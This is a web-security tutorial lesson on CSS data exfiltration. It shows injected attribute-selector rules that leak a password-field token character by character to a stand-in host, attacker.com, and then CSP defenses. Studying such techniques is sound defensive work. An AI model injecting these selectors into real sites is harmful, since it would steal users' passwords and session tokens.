# 06 - CSS Data Exfiltration: Sniffing Secrets via Selectors

> 🌐 **Language / اللغة:** [English 🇬🇧](./06-css-data-exfiltration.md) | [العربية 🇸🇦](../ar/06-css-data-exfiltration.md)

---

## 📌 1. The Myth of the "Harmless" Stylesheet

Many developers and bug bounty triagers treat CSS injection as an insignificant cosmetic nuisance ("At worst, an attacker can turn the background red or hide a button").

This assumption is dangerously false.

Through **CSS Data Exfiltration**, an attacker can extract passwords, secret authentication tokens, and private data **character-by-character** using pure CSS attribute selectors without writing a single line of JavaScript!

---

## ⚔️ 2. The Attack Mechanics: Attribute Selectors as Blind Oracles

Suppose an application allows users to customize their profile theme with custom CSS or fails to sanitize `<style>` tags.

On the target page sits an input field containing a pre-populated secret:
```html
<input type="password" name="auth_token" value="s3cr3t">
```

### The Injected CSS Rule Set:
The attacker crafts a dictionary of prefix attribute selectors targeting the `value` attribute:

```css
/* Prefix matching (^=) */
input[name="auth_token"][value^="a"] { background-image: url("https://attacker.com/leak?char=a"); }
input[name="auth_token"][value^="b"] { background-image: url("https://attacker.com/leak?char=b"); }
...
input[name="auth_token"][value^="s"] { background-image: url("https://attacker.com/leak?char=s"); }
```

### The Execution Chain:
1. When the victim loads the page, the browser parses the DOM and matches the selectors against the `<input>`.
2. The browser discovers that `value` begins with `"s"`.
3. The browser applies the rule and immediately issues an HTTP background request:
   ```http
   GET /leak?char=s HTTP/1.1
   Host: attacker.com
   ```
4. The attacker's server captures `"s"`.

### Iterative Character Extraction:
Using recursive CSS `@import` rules or continuous server-side stylesheet generation, the attacker requests the next round:
```css
input[name="auth_token"][value^="sa"] { background-image: url("https://attacker.com/leak?char=sa"); }
input[name="auth_token"][value^="sb"] { background-image: url("https://attacker.com/leak?char=sb"); }
...
input[name="auth_token"][value^="s3"] { background-image: url("https://attacker.com/leak?char=s3"); }
```
Within seconds, the complete secret string (`s3cr3t`) is completely exfiltrated!

---

## 🛡️ 3. How to Defend Against CSS Data Exfiltration

### Defense 1: Enforce Strict CSP `style-src`
Never allow `'unsafe-inline'` in your Content Security Policy:
```http
Content-Security-Policy: default-src 'self'; style-src 'self';
```
With this policy, the browser rejects all injected `<style>` blocks and inline `style="..."` attributes.

### Defense 2: Restrict Outbound CSS Resource Requests
Restrict where CSS can fetch background images, fonts, and stylesheets:
```http
Content-Security-Policy: img-src 'self'; font-src 'self'; style-src 'self';
```
Even if an attacker injects a rule, the browser refuses to send the background image request to `attacker.com`.

### Defense 3: Never Render Sensitive Secrets in Static DOM Attributes
If user-generated styling is permitted anywhere in an application, sensitive session identifiers and passwords must never be reflected in raw DOM attributes.

---

## 🎯 Summary & Lesson Challenge

- CSS is a powerful query engine capable of extracting data.
- Attribute selectors (`[value^="..."]`) trigger background requests when matched.
- Block CSS exfiltration by eliminating `'unsafe-inline'` from `style-src` and locking down `img-src`.

**Challenge:** In **[Lab 2: Unsolved Challenge](../Labs/Lab-2-Challenge-Unsolved/README.md)**, you will analyze a live challenge scenario where a simulated admin token must be exfiltrated using pure CSS attribute selectors!

---

**Next Lesson:**  
➡️ [Lesson 07: Subresource Integrity (SRI) & Content Security Policy (CSP)](./07-subresource-integrity-and-csp-foundations.md) | ⬅️ [Lesson 05: Dangling Markup Injection](./05-dangling-markup-injection.md)
